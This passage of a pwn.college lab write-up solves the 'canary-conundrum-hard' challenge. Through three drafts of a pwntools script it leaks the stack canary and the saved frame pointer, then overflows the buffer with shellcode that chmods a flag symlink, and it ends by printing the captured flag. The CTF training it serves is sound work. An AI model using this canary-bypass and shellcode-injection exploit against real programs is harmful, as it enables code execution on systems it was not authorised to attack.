+────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x58eca32a4c4c None
+   1   0x58eca32a4ce1 None
+   2   0x58eca32a4ddf None
+   3   0x7d5ff3872083 __libc_start_main+243
+   4   0x58eca32a41ce None
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+The buffer address for the `n+1`th frame is `0x7fff591b05b0`.
+
+- [x] Location of the buffer: `0x7fffedf75bd0`
+- [x] Location of the canary: `0x7fffedf75c38`
+- [x] Location of stored return address to `main()`: `0x7fffedf75c48`
+- [ ] Offset between buffers of `n`th and `n+1`th frames of the `challenge()` function
+   - [x] Location of buffer for `n` th frame: `0x7fff591b0670`
+   - [x] Location of buffer for `n+1`th frame: `0x7fff591b05b0` 
+- [ ] Last 4 nibbles of the `n+1`th buffer
+- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
+
+```
+rip: 0x7fff0fa20648
+buf: 0x7fff0fa205d0
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+p = process("/challenge/canary-conundrum-hard")
+
+# Initialize values
+buffer_addr = 0x7fffedf75bd0
+canary_addr = 0x7fffedf75c38
+addr_of_saved_ip = 0x7fff0fa20648
+nth_buffer_addr = 0x7fff591b0670
+n_plus_1th_buffer_addr = 0x7fff591b05b0
+offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 192 bytes
+
+# --- STAGE 1: LEAK CANARY ---
+# Calculate offset_to_canary and payload_size
+offset_to_canary = canary_addr - buffer_addr
+payload_size = offset_to_canary + 1
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+# Extract canary
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+print(f"Canary : {hex(canary)}")
+
+
+# # --- STAGE 2: FINAL PAYLOAD ---
+# # Shellcode
+# shellcode_asm = """
+#    /* chmod("z", 0004) */
+#    push 0x5a
+#    push rsp
+#    pop rdi
+#    pop rax
+#    mov sil, 0x4
+#    syscall
+# """
+# shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
+# shellcode = asm(shellcode_asm)
+# print(f"Shellcode length: {len(shellcode)}")
+
+# # Calculate offset_to_ret and payload_size
+# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+# payload_size = offset_to_canary + 8 + offset_to_ret + 8
+
+# # Send payload size
+# p.sendline(str(payload_size).encode())
+
+# # Craft payload
+# payload = shellcode
+# payload += b"A" * (offset_to_canary - len(shellcode))
+# payload += p64(canary)
+# payload += b"B" * offset_to_ret
+# payload += p64(shellcode_address)
+
+# # Send payload
+# p.recvuntil(b"bytes)!")
+# p.send(payload)
+
+p.interactive()
+```
+
+
+
+```py
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+p = process("/challenge/canary-conundrum-hard")
+
+# Initialize values
+buffer_addr = 0x7fffedf75bd0
+canary_addr = 0x7fffedf75c38
+addr_of_saved_ip = 0x7fff0fa20648
+nth_buffer_addr = 0x7fff591b0670
+n_plus_1th_buffer_addr = 0x7fff591b05b0
+offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 192 bytes
+
+# --- STAGE 1: LEAK CANARY ---
+# Calculate offset_to_canary and payload_size
+offset_to_canary = canary_addr - buffer_addr
+payload_size = offset_to_canary + 1
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+# Extract canary
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+print(f"Canary : {hex(canary)}")
+
+
+# --- STAGE 2: LEAK SAVED RBP ---
+# Calculate offset_to_canary and payload_size
+offset_to_rbp = 8
+payload_size = offset_to_canary + 8 + offset_to_rbp
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+# Extract canary (7 bytes because the null byte was overwritten)
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+# Extract the Saved RBP (usually 6 bytes are non-zero in a 0x7ff... address)
+# We can read 6 bytes and pad it to 8.
+stored_rbp_raw = p.recv(6)
+stored_rbp = u64(stored_rbp_raw.ljust(8, b'\x00'))
+
+
+
+print(f"Canary     : {hex(canary)}")
+print(f"Stored RBP : {hex(stored_rbp)}")
+
+
+
+# # --- STAGE 2: FINAL PAYLOAD ---
+# # Shellcode
+# shellcode_asm = """
+#    /* chmod("z", 0004) */
+#    push 0x5a
+#    push rsp
+#    pop rdi
+#    pop rax
+#    mov sil, 0x4
+#    syscall
+# """
+# shellcode_address = actual_buffer_addr_during_stage_1 - offset_buffers_diff_challenge_frames
+# shellcode = asm(shellcode_asm)
+# print(f"Shellcode length: {len(shellcode)}")
+
+# # Calculate offset_to_ret and payload_size
+# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+# payload_size = offset_to_canary + 8 + offset_to_ret + 8
+
+# # Send payload size
+# p.sendline(str(payload_size).encode())
+
+# # Craft payload
+# payload = shellcode
+# payload += b"A" * (offset_to_canary - len(shellcode))
+# payload += p64(canary)
+# payload += b"B" * offset_to_ret
+# payload += p64(shellcode_address)
+
+# # Send payload
+# p.recvuntil(b"bytes)!")
+# p.send(payload)
+
+p.interactive()
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+context.arch = "amd64"
+context.os = "linux"
+context.log_level = "error"
+
+p = process("/challenge/canary-conundrum-hard")
+
+# Initialize values
+buffer_addr = 0x7fffedf75bd0
+canary_addr = 0x7fffedf75c38
+addr_of_saved_ip = 0x7fff0fa20648
+nth_buffer_addr = 0x7fff591b0670
+n_plus_1th_buffer_addr = 0x7fff591b05b0
+offset_buffers_diff_challenge_frames = nth_buffer_addr - n_plus_1th_buffer_addr        # 192 bytes
+
+# --- STAGE 1: LEAK CANARY ---
+# Calculate offset_to_canary and payload_size
+offset_to_canary = canary_addr - buffer_addr
+payload_size = offset_to_canary + 1
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+# Extract canary
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+print(f"Canary : {hex(canary)}")
+
+
+# --- STAGE 2: LEAK SAVED RBP ---
+# Calculate offset_to_canary and payload_size
+offset_to_rbp = 8
+payload_size = offset_to_canary + 8 + offset_to_rbp
+
+# Send payload_size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = b"REPEAT"
+payload += b"A" * (offset_to_canary - 6)
+payload += b"B"
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+output = p.recvuntil(b'AAAAAB')
+output_str = output.decode()
+
+# Extract canary (7 bytes because the null byte was overwritten)
+canary_raw = p.recv(7)
+canary = u64(canary_raw.rjust(8, b'\x00'))
+
+# Extract the Saved RBP (usually 6 bytes are non-zero in a 0x7ff... address)
+# We can read 6 bytes and pad it to 8.
+stored_rbp_raw = p.recv(6)
+stored_rbp = u64(stored_rbp_raw.ljust(8, b'\x00'))
+
+print(f"Canary     : {hex(canary)}")
+print(f"Stored RBP : {hex(stored_rbp)}")
+
+
+# --- STAGE 2: FINAL PAYLOAD ---
+# Shellcode
+shellcode_asm = """
+   /* chmod("z", 0004) */
+   push 0x5a
+   push rsp
+   pop rdi
+   pop rax
+   mov sil, 0x4
+   syscall
+"""
+shellcode_address = stored_rbp - 8 - offset_to_canary - offset_buffers_diff_challenge_frames - offset_buffers_diff_challenge_frames
+shellcode = asm(shellcode_asm)
+print(f"Shellcode length: {len(shellcode)}")
+
+# Calculate offset_to_ret and payload_size
+# offset_to_ret = addr_of_saved_ip - (canary_addr + 8)
+payload_size = offset_to_canary + 8 + 8 + 8
+
+# Send payload size
+p.recvuntil(b"Payload size: ")
+p.sendline(str(payload_size).encode())
+
+# Craft payload
+payload = shellcode
+payload += b"A" * (offset_to_canary - len(shellcode))
+payload += p64(canary)
+payload += b"B" * 8
+payload += p64(shellcode_address)
+
+# Send payload
+p.recvuntil(b"bytes)!")
+p.send(payload)
+
+p.interactive()
+```
+
+```
+hacker@program-security~canary-conundrum-hard:~$ cat ~/Z
+pwn.college{8RvfUAFICv_UXCpecwX5XIt5Pwg.0FNyMDL4ITM0EzW}
+```
